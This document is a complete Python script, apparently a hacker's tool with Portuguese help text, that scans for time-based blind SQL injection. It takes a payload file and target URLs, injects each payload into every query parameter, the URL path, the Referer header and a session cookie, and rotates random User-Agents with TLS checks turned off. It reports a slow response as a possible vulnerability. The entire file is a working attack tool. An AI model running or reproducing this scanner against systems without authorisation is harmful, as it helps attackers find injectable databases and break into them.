import requests
import time
import argparse
import random
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init
import urllib3

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
]

def show_banner():
    banner = f"""
{Fore.RED}
 █     █░▓█████  ██▓     ██▓     ▄▄▄▄     ██████   █████   ██▓     ██▓
▓█░ █ ░█░▓█   ▀ ▓██▒    ▓██▒    ▓█████▄ ▒██    ▒ ▒██▓  ██▒▓██▒    ▓██▒
▒█░ █ ░█ ▒███   ▒██░    ▒██░    ▒██▒ ▄██░ ▓██▄   ▒██▒  ██░▒██░    ▒██▒
░█░ █ ░█ ▒▓█  ▄ ▒██░    ▒██░    ▒██░█▀    ▒   ██▒░██  █▀ ░▒██░    ░██░
░░██▒██▓ ░▒████▒░██████▒░██████▒░▓█  ▀█▓▒██████▒▒░▒███▒█▄ ░██████▒░██░
░ ▓░▒ ▒  ░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░░▒▓███▀▒▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░░▓  
  ▒ ░ ░   ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░▒░▒   ░ ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░ ▒ ░
  ░   ░     ░     ░ ░     ░ ░    ░    ░ ░  ░  ░     ░   ░   ░ ░    ▒ ░
    ░       ░  ░    ░  ░    ░  ░ ░            ░      ░        ░  ░ ░  
                                      ░                               

{Style.RESET_ALL}
Created by well0x01

Time-based Blind SQL Injection Script

Options:
  -u, --url          URL da API que será testada
  -l, --list         Arquivo contendo uma lista de URLs para testar
  -p, --payload-file Arquivo contendo a lista de payloads para testar
  -o, --output       Arquivo para salvar os resultados de sucesso
  -s, --server-http  Proxy HTTP para direcionar as solicitações (ex: http://127.0.0.1:8080)
  -h, --help         Mostrar este banner e as opções disponíveis
"""
    print(banner)

def test_payload(url, payload, proxy, output_file=None):
    delay = int(payload.split('SLEEP(')[-1].split(')')[0]) if 'SLEEP(' in payload else 5
    start_time = time.time()
    headers = {
        'User-Agent': random.choice(user_agents),
        'Referer': payload,
        'Cookie': f'session={payload}',
    }
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    try:
        response = requests.get(url, headers=headers, proxies=proxies, timeout=delay + 5, verify=False)
        elapsed_time = time.time() - start_time

        if elapsed_time > delay:
            result = f"Possível vulnerabilidade encontrada com o payload: {payload} na URL: {url} | Tempo de resposta: {elapsed_time:.2f} segundos\n"
            print(Fore.GREEN + result)
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(result + "\n")
        else:
            result = f"Payload não parece ter sucesso: {payload} na URL: {url} | Tempo de resposta: {elapsed_time:.2f} segundos\n"
            print(Fore.RED + result)
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Erro ao testar o payload {payload} na URL: {url}: {e}\n")

def inject_payloads_in_url(url, payload):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    for param in query_params:
        query_params[param] = [payload]

    new_query = urlencode(query_params, doseq=True)
    new_url = urlunparse(parsed_url._replace(query=new_query))

    new_path = parsed_url.path.rstrip('/') + '/' + payload
    new_url_with_path = urlunparse(parsed_url._replace(path=new_path))

    return [new_url, new_url_with_path]

def main():
    parser = argparse.ArgumentParser(description="Time-based Blind SQL Injection Script", add_help=False)
    parser.add_argument("-u", "--url", help="URL da API que será testada")
    parser.add_argument("-l", "--list", help="Arquivo contendo uma lista de URLs para testar")
    parser.add_argument("-p", "--payload-file", required=True, help="Arquivo contendo a lista de payloads para testar")
    parser.add_argument("-o", "--output", help="Arquivo para salvar os resultados de sucesso")
    parser.add_argument("-s", "--server-http", help="Proxy HTTP para direcionar as solicitações (ex: http://127.0.0.1:8080)")
    parser.add_argument("-h", "--help", action='store_true', help="Mostrar este banner e as opções disponíveis")
    args = parser.parse_args()

    if args.help:
        show_banner()
        parser.print_help()
        return

    show_banner()
    
    urls = []
    if args.url:
        urls.append(args.url)
    if args.list:
        try:
            with open(args.list, 'r') as f:
                urls.extend(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            print(f"Arquivo de lista de URLs não encontrado: {args.list}")
            return

    try:
        with open(args.payload_file, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Arquivo de payloads não encontrado: {args.payload_file}")
        return

    proxy = args.server_http
    output_file = args.output

    for url in urls:
        for payload in payloads:
            urls_with_payload = inject_payloads_in_url(url, payload)
            for url_with_payload in urls_with_payload:
                test_payload(url_with_payload, payload, proxy, output_file)

if __name__ == "__main__":
    main()
